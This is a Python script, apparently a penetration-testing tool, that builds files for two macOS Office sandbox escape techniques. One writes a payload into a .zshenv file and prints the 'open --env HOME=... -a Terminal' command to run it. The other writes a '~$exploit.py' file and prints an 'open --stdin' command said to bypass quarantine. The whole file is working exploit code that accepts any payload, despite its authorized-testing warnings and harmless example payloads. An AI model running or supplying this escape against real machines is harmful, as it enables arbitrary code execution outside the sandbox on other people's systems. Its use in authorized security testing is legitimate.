#!/usr/bin/env python3
"""
Create files for macOS Office sandbox bypass via environment variables or stdin.

WARNING: Only use for authorized security testing on systems you own.
"""

import argparse
import os
import sys


def create_zshenv_bypass(payload: str, target_folder: str) -> str:
    """
    Create a .zshenv file for the --env bypass technique.
    
    Args:
        payload: The command to execute
        target_folder: Folder inside sandbox where .zshenv will be created
    
    Returns:
        Path to the created .zshenv file
    """
    
    # Ensure target folder exists
    os.makedirs(target_folder, exist_ok=True)
    
    zshenv_path = os.path.join(target_folder, ".zshenv")
    
    with open(zshenv_path, "w") as f:
        f.write(f"# Auto-generated for testing\n{payload}\n")
    
    os.chmod(zshenv_path, 0o644)
    
    print(f"[+] Created .zshenv: {zshenv_path}")
    print(f"[+] Payload: {payload}")
    print()
    print("[!] To test:")
    print(f"[!] Run: open --env HOME={target_folder} --env __OSINSTALL_ENVIROMENT=1 -a Terminal")
    print("[!] Terminal will execute .zshenv from the modified HOME")
    print()
    print(f"[!] To remove: rm {zshenv_path}")
    
    return zshenv_path


def create_stdin_bypass(payload: str, output_path: str = None) -> str:
    """
    Create a Python script for the --stdin bypass technique.
    
    Args:
        payload: Python code to execute
        output_path: Where to save the script (default: ~/~$exploit.py)
    
    Returns:
        Path to the created script
    """
    
    if output_path is None:
        home = os.path.expanduser("~")
        output_path = os.path.join(home, "~$exploit.py")
    
    with open(output_path, "w") as f:
        f.write(f"#!/usr/bin/env python3\n# Auto-generated for testing\n{payload}\n")
    
    os.chmod(output_path, 0o644)
    
    print(f"[+] Created Python script: {output_path}")
    print(f"[+] Payload: {payload}")
    print()
    print("[!] To test:")
    print(f"[!] Run: open --stdin='{output_path}' -a Python")
    print("[!] Python will execute the script from stdin (bypasses quarantine)")
    print()
    print(f"[!] To remove: rm {output_path}")
    
    return output_path


def main():
    parser = argparse.ArgumentParser(
        description="Create files for macOS Office sandbox environment/stdin bypass testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
WARNING: Only use for authorized security testing on systems you own.

Examples:
  %(prog)s --env --payload "echo test > ~/test_output.txt" --target ~/sandbox/test
  %(prog)s --stdin --payload "import os; os.system('echo test > ~/test_output.txt')"
  %(prog)s --stdin --payload "print('Hello from sandbox escape')"
"""
    )
    
    parser.add_argument(
        "--env", "-e",
        action="store_true",
        help="Create .zshenv for --env bypass technique"
    )
    
    parser.add_argument(
        "--stdin", "-i",
        action="store_true",
        help="Create Python script for --stdin bypass technique"
    )
    
    parser.add_argument(
        "--payload", "-p",
        required=True,
        help="Command or Python code to execute"
    )
    
    parser.add_argument(
        "--target", "-t",
        help="Target folder for --env bypass (required with --env)"
    )
    
    parser.add_argument(
        "--output", "-o",
        help="Output path for --stdin bypass (default: ~/~$exploit.py)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("macOS Office Sandbox Bypass - Environment/Stdin Test")
    print("=" * 60)
    print()
    print("⚠️  WARNING: Only use for authorized security testing!")
    print()
    
    if args.env:
        if not args.target:
            print("[!] Error: --target is required for --env bypass")
            sys.exit(1)
        create_zshenv_bypass(args.payload, args.target)
    elif args.stdin:
        create_stdin_bypass(args.payload, args.output)
    else:
        print("[!] Error: Must specify either --env or --stdin")
        sys.exit(1)


if __name__ == "__main__":
    main()
